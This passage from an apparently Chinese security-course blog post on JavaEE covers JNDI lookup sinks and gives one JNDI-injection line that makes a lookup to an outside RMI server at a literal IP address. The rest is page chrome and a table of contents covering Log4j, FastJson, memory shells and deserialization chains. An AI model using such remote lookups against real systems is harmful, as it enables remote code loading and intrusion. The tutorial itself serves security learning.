<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">InitialDirContext.lookup()</span><br><span class="line">Spring LdapTemplate.lookup()</span><br><span class="line">LdapTemplate.lookupContext()</span><br></pre></td></tr></table></figure>

<h3 id="JNDI远程调用-JNDI-Injection"><a href="#JNDI远程调用-JNDI-Injection" class="headerlink" title="JNDI远程调用-JNDI-Injection"></a>JNDI远程调用-JNDI-Injection</h3><ul>
<li>创建一个rmi ldap等服务调用 <strong>实例化对象</strong></li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new InitialContext().lookup(&quot;rmi://47.243.50.47:1099/ptbddl&quot;);</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.geekgold.xyz">GoldY</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.geekgold.xyz/posts/1288cce5.html">https://www.geekgold.xyz/posts/1288cce5.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://www.geekgold.xyz" target="_blank">GoldY</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/">小迪安全</a></div><div class="post-share"><div class="social-share" data-image="/img/xiao_f.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zhifubao.jpg" target="_blank"><img class="post-qr-code-img" src="/img/zhifubao.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/b4ffc751.html" title="小迪安全--安全开发上篇(3)"><img class="cover" src="/img/xiao_f.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">小迪安全--安全开发上篇(3)</div></div><div class="info-2"><div class="info-item-1">PHP参考文档：025-安全开发-PHP应用&amp;文件管理&amp;包含&amp;写入&amp;删除&amp;下载&amp;上传&amp;遍历&amp;安全_php 文件管理-CSDN博客 第一天PHP应用&amp;留言板功能&amp;超全局变量&amp;数据库操作&amp;第三方 插件引用 环境配置安装PHPStromPhpStorm: The PHP IDE by...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/e1dc7286.html" title="小迪安全--基础讲解(1)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">小迪安全--基础讲解(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/dba72746.html" title="小迪安全--信息打点(2)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-18</div><div class="info-item-2">小迪安全--信息打点(2)</div></div><div class="info-2"><div class="info-item-1">业务资产查询平台：    小蓝本 https://www.xiaolanben.com/    爱企查 https://aiqicha.baidu.com/   业务类型 WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6. 其他产品等 Web应用工具大全 [~]#棱角 ::Edge.Forum 主要资产内容  WEB 应用 2. APP 应用 3. PC 端应用 4. 小程序应用 5. 微信公众号 6....</div></div></div></a><a class="pagination-related" href="/posts/b4ffc751.html" title="小迪安全--安全开发上篇(3)"><img class="cover" src="/img/xiao_f.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-12</div><div class="info-item-2">小迪安全--安全开发上篇(3)</div></div><div class="info-2"><div class="info-item-1">PHP参考文档：025-安全开发-PHP应用&amp;文件管理&amp;包含&amp;写入&amp;删除&amp;下载&amp;上传&amp;遍历&amp;安全_php 文件管理-CSDN博客 第一天PHP应用&amp;留言板功能&amp;超全局变量&amp;数据库操作&amp;第三方 插件引用 环境配置安装PHPStromPhpStorm: The PHP IDE by...</div></div></div></a><a class="pagination-related" href="/posts/3b40f62a.html" title="老男孩--信息收集(1)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--信息收集(1)</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a><a class="pagination-related" href="/posts/e33055a4.html" title="老男孩--手机端信息收集及渗透(3)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--手机端信息收集及渗透(3)</div></div><div class="info-2"><div class="info-item-1">——–APP———-APP资产收集APP中含有连接服务器的相关域名、IP等信息，通过相关工具即可实现提取 AppInfoScanner项目地址：kelvinBen&#x2F;AppInfoScanner 一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。 使用配置： 12cd AppInfoScannerpython -m pip install -r requirements.txt    运行方法： 12345678#扫描Android应用的APK文件、DEX文件、需要下载的APK文件下载地址、保存需要扫描的文件的目录python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File...</div></div></div></a><a class="pagination-related" href="/posts/f7a7b84b.html" title="老男孩--DDOS攻击与防御(4)"><img class="cover" src="/img/oldboy.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-12</div><div class="info-item-2">老男孩--DDOS攻击与防御(4)</div></div><div class="info-2"><div class="info-item-1">基础知识本教程仅在合法授权的情况下进行测试和研究，请勿用于其他用途。未经授权使用此类工具可能会侵犯他人隐私，触犯相关法律，任何因此引发的法律或利益纠纷与本人无关。 DDOS介绍DOS攻击：指的是采取一对一的方式，攻击目标服务器，使攻击目标CPU使用率提高，网络可以带宽减少等方式耗尽服务器的资源 DDOS攻击：攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DoS攻击，从而成倍地提高拒绝服务攻击的威力。 被攻击时的现象：  被攻击的主机上有大量等待的TCP连接。 网络中充斥着大量的无用的数据包，源地址为假。 制造高流量无用数据，造成网络拥塞，使被攻击的主机无法正常通信。 利用受害主机提供的服务或传输协议上的缺陷，反复高速的发出特定的服务请求，使受害主机无法及时处理所有正常请求。 严重时会造成系统死机。  DDOS类型流量型攻击ICMP Flood攻击攻击介绍攻击原理：就是向目标发送大量的 ICMP Echo-Reply（type 0，code 0）或 Echo-Request（type...</div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/preview.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">GoldY</div><div class="author-info-description">不经一番寒彻骨，怎得梅花扑鼻香。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">9</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/yuwenjin666"><i class="fab fa-github"></i><span>Github主页</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">联系我V：GoldY_66</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaEE%E5%BA%94%E7%94%A8-Servlet%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF-JDBC-Mybatis%E6%95%B0%E6%8D%AE%E5%BA%93-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">1.</span> <span class="toc-text">JavaEE应用&amp;Servlet路由技术&amp;JDBC&amp;Mybatis数据库&amp;生命周期</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAJavaEE%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.1.</span> <span class="toc-text">创建JavaEE项目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaEE-HTTP-Servlet-%E8%B7%AF%E7%94%B1-%E5%91%A8%E6%9C%9F"><span class="toc-number">1.2.</span> <span class="toc-text">JavaEE-HTTP-Servlet&amp;路由&amp;周期</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.1.</span> <span class="toc-text">Servlet介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E9%85%8D%E7%BD%AEServlet"><span class="toc-number">1.2.2.</span> <span class="toc-text">创建配置Servlet</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">GET方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">POST方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">其他内置方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HttpServletRequest-HttpServletResponse-%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.3.</span> <span class="toc-text">HttpServletRequest  HttpServletResponse 详解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93-JDBC-Mybatis-%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">数据库-JDBC&amp;Mybatis&amp;库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8"><span class="toc-number">1.3.1.</span> <span class="toc-text">安装使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85jar"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">安装jar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E7%94%A8%E5%B0%81%E8%A3%85jar"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">引用封装jar</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E9%A9%B1%E5%8A%A8"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">注册数据库驱动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">建立数据库连接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9B%E5%BB%BAStatement%E6%89%A7%E8%A1%8CSQL"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">创建Statement执行SQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E7%BB%93%E6%9E%9C%E5%AF%B9%E8%B1%A1%E8%BF%9B%E8%A1%8C%E6%8F%90%E5%8F%96"><span class="toc-number">1.3.1.6.</span> <span class="toc-text">对结果对象进行提取</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.2.</span> <span class="toc-text">安全问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaEE%E5%BA%94%E7%94%A8-Filter%E8%BF%87%E6%BB%A4%E5%99%A8-Listener%E7%9B%91%E5%90%AC%E5%99%A8-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">2.</span> <span class="toc-text">JavaEE应用&amp;Filter过滤器&amp;Listener监听器&amp;访问控制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaEE-%E8%BF%87%E6%BB%A4%E5%99%A8-Filter"><span class="toc-number">2.1.</span> <span class="toc-text">JavaEE-过滤器-Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">2.1.1.</span> <span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.1.2.</span> <span class="toc-text">创建过滤器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">过滤器内置方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E8%A7%A6%E5%8F%91"><span class="toc-number">2.1.3.</span> <span class="toc-text">配置过滤器的触发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%EF%BC%9Acookie%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">2.1.4.</span> <span class="toc-text">利用过滤器简单实现：cookie身份验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.1.5.</span> <span class="toc-text">内存马</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaEE-%E7%9B%91%E5%90%AC%E5%99%A8-Listen"><span class="toc-number">2.2.</span> <span class="toc-text">JavaEE-监听器-Listen</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E7%9B%91%E5%90%AC%E5%99%A8"><span class="toc-number">2.2.1.</span> <span class="toc-text">创建监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95"><span class="toc-number">2.2.2.</span> <span class="toc-text">监听器内置方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">监听器触发流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E5%99%A8%E5%AE%89%E5%85%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.2.3.</span> <span class="toc-text">监听器安全场景</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaEE%E5%BA%94%E7%94%A8-%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-%E6%94%BB%E5%87%BB%E9%93%BE-%E7%B1%BB%E5%AF%B9%E8%B1%A1-%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E6%96%B9%E6%B3%95-%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">JavaEE应用&amp;反射机制&amp;攻击链&amp;类对象&amp;成员变量方法&amp;构造方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E4%B8%AD%E7%9A%84%E7%B1%BB%E5%90%8D-%E5%8F%98%E9%87%8F-%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">反射中的类名&amp;变量&amp;方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%A6%82%E5%BF%B5"><span class="toc-number">3.2.</span> <span class="toc-text">反射概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84-Class%E5%AF%B9%E8%B1%A1%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="toc-number">3.3.</span> <span class="toc-text">反射-Class对象类获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84-Field%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="toc-number">3.4.</span> <span class="toc-text">反射-Field成员变量类获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84-Constructor%E6%9E%84%E9%80%A0%E6%96%B9%E6%B3%95%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="toc-number">3.5.</span> <span class="toc-text">反射-Constructor构造方法类获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84-Method%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95%E7%B1%BB%E8%8E%B7%E5%8F%96"><span class="toc-number">3.6.</span> <span class="toc-text">反射-Method成员方法类获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84-%E4%B8%8D%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">3.6.1.</span> <span class="toc-text">反射-不安全命令执行&amp;反序列化链构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%8F%8D%E5%B0%84%E5%AE%9E%E7%8E%B0-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.6.1.1.</span> <span class="toc-text">1、反射实现-命令执行</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaEE%E5%BA%94%E7%94%A8-%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%87%8D%E5%86%99%E6%96%B9%E6%B3%95-%E9%93%BE%E6%9D%A1%E5%88%86%E6%9E%90-%E8%A7%A6%E5%8F%91%E7%B1%BB-%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.</span> <span class="toc-text">JavaEE应用&amp;原生反序列化&amp;重写方法&amp;链条分析&amp;触发类&amp;类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E8%A7%A3%E9%87%8A-%E4%BD%BF%E7%94%A8-%E5%AE%89%E5%85%A8"><span class="toc-number">4.1.</span> <span class="toc-text">反序列化-解释&amp;使用&amp;安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%A6%82%E5%BF%B5"><span class="toc-number">4.1.1.</span> <span class="toc-text">序列化&amp;反序列化-概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.1.1.1.</span> <span class="toc-text">1、序列化与反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E6%8A%80%E6%9C%AF"><span class="toc-number">4.1.1.2.</span> <span class="toc-text">2、序列化技术</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.1.1.3.</span> <span class="toc-text">3、常见的序列化和反序列化协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%87%BA%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">4.1.1.4.</span> <span class="toc-text">4、为什么会出现反序列化安全问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">4.1.1.5.</span> <span class="toc-text">5、反序列化利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%94%9F%E4%BD%BF%E7%94%A8-%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.1.2.</span> <span class="toc-text">原生使用-序列化&amp;反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-%E9%87%8D%E5%86%99%E6%96%B9%E6%B3%95-%E8%A7%A6%E5%8F%91%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.3.</span> <span class="toc-text">安全问题-重写方法&amp;触发方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98-%E5%8F%AF%E6%8E%A7%E5%85%B6%E4%BB%96%E7%B1%BB%E9%87%8D%E5%86%99%E6%96%B9%E6%B3%95"><span class="toc-number">4.1.4.</span> <span class="toc-text">安全问题-可控其他类重写方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8-HashMap%E5%AD%98%E5%9C%A8%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84readObject%E6%96%B9%E6%B3%95%EF%BC%8C%E8%B0%83%E7%94%A8%E4%BA%86HashMap-putVal-%E6%96%B9%E6%B3%95%EF%BC%8C%E6%9C%80%E7%BB%88%E8%B0%83%E7%94%A8%E4%BA%86URL-hashCode-%E5%BD%A2%E6%88%90RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.1.4.1.</span> <span class="toc-text">1.利用 HashMap存在的反序列化漏洞的readObject方法，调用了HashMap.putVal() 方法，最终调用了URL.hashCode()形成RCE漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-RCE%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">4.1.4.2.</span> <span class="toc-text">2.RCE漏洞简介</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaEE%E5%BA%94%E7%94%A8-%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6-Log4j%E6%97%A5%E5%BF%97-FastJson%E5%BA%8F%E5%88%97%E5%8C%96-JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">JavaEE应用&amp;第三方组件&amp;Log4j日志&amp;FastJson序列化&amp;JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7-%E9%85%8D%E7%BD%AE"><span class="toc-number">5.1.</span> <span class="toc-text">Java-项目管理工具-配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI"><span class="toc-number">5.2.</span> <span class="toc-text">JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5"><span class="toc-number">5.2.1.</span> <span class="toc-text">相关概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.2.</span> <span class="toc-text">JNDI注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6-Log4J-JNDI"><span class="toc-number">5.3.</span> <span class="toc-text">三方组件-Log4J&amp;JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4J"><span class="toc-number">5.3.1.</span> <span class="toc-text">Log4J</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Log4j-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.3.2.</span> <span class="toc-text">Log4j-组件安全复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81Maven%E5%BC%95%E7%94%A8Log4j"><span class="toc-number">5.3.2.1.</span> <span class="toc-text">1、Maven引用Log4j</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%8E%A5%E5%8F%97%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%80%BC"><span class="toc-number">5.3.2.2.</span> <span class="toc-text">2、接受用户输入值</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%88%A9%E7%94%A8jndi-ldap%E6%89%A7%E8%A1%8C"><span class="toc-number">5.3.2.3.</span> <span class="toc-text">3、利用jndi-ldap执行</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#marshalsec%E4%BD%BF%E7%94%A8"><span class="toc-number">5.3.2.3.1.</span> <span class="toc-text">marshalsec使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JNDI-Injection-Exploit"><span class="toc-number">5.3.2.3.2.</span> <span class="toc-text">JNDI-Injection-Exploit</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6-FastJson-%E5%8F%8D%E5%B0%84"><span class="toc-number">5.4.</span> <span class="toc-text">三方组件-FastJson&amp;反射</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Fastjson-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8D%E7%8E%B0"><span class="toc-number">5.4.1.</span> <span class="toc-text">Fastjson-组件安全复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81Maven%E5%BC%95%E7%94%A8Fastjson"><span class="toc-number">5.4.1.1.</span> <span class="toc-text">1、Maven引用Fastjson</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%88%9B%E5%BB%BA%E9%9C%80%E8%BD%AC%E6%8D%A2%E7%B1%BB%E5%AF%B9%E8%B1%A1User"><span class="toc-number">5.4.1.2.</span> <span class="toc-text">2、创建需转换类对象User</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8Fastjson%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E8%BD%AC%E6%8D%A2%EF%BC%88%E5%AF%B9%E8%B1%A1%E8%BD%ACJson%EF%BC%89"><span 